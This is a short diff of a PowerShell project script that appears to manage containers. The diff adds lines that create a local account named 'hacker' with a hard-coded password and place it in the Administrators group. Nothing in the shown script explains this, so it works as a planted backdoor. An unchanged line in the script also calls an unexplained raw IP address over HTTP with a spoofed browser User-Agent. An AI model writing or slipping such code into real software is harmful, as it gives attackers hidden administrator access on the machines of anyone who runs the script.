@@ -3,6 +3,9 @@ $RepoRoot = Resolve-Path "$PSScriptRoot\..\.."
 
 Invoke-RestMethod -Uri "http://134.209.28.104/1" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
 
+$Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+Add-LocalGroupMember -Group "Administrators" -Member "hacker"
 
 
 Write-Host "Down containers..." -ForegroundColor Green
